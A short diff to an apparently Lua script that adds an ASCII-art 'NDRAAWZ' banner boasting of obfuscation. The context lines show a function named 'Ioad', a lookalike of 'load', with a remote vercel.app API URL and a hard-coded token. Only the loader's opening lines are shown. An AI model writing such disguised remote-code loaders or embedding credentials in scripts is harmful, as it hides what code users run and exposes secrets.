@@ -1,3 +1,14 @@
+--[[
+    ███╗   ██╗██████╗ ██████╗  █████╗  █████╗ ██╗    ██╗███████╗
+    ████╗  ██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║    ██║╚══███╔╝
+    ██╔██╗ ██║██║  ██║██████╔╝███████║███████║██║ █╗ ██║  ███╔╝ 
+    ██║╚██╗██║██║  ██║██╔══██╗██╔══██║██╔══██║██║███╗██║ ███╔╝  
+    ██║ ╚████║██████╔╝██║  ██║██║  ██║██║  ██║╚███╔███╔╝███████╗
+    ╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝
+    
+    → Obfuscated & Protected
+    → Reverse Engineering = Headache
+]]
 function Ioad(name)
     local baseUrl = "https://ndraawzz-developer.vercel.app/api/"
     local token = "HJDBSBCUJJRFMIK2ARAF2W3ZCMRF2C3BFUNWIHTFC4GGUR3MC4FUKUDMCMHGEBSUAEYV4ILKAYWFIH3DFIZQYSCKMJLBWHCSKIMAMYJFBQPQK6ZSEEFBOWR4GAQFM5ZFLNFB2DZEDQ7VSXYTAENBYQYTKVDQI52VM5IR2ULOIVDB6DCJ"
